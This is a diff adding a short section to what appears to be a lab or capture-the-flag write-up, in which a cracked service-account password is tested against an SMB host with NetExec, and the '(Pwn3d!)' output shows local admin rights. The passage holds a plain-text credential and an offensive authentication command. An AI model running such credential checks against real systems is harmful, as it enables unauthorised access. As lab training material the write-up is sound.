@@ -206,3 +206,10 @@ svc_webpool:D@rkH@v3n128!
 So cracking the hash failed with rockyou but i saw a wordlist of previous password on the domain in the SMB share which is able to crack it!
 
 ## Checking authentication
+```python
+nxc smb web.ext.darkhaven.local -u 'svc_webpool' -p 'D@rkH@v3n128!' --local-auth
+SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:EC2AMAZ-IKFPL26) (signing:False) (SMBv1:None)
+SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\svc_webpool:D@rkH@v3n128! (Pwn3d!)
+```
+The output is giving me a `(Pwn3d!)` indicated which tells me this user is an admin!
+
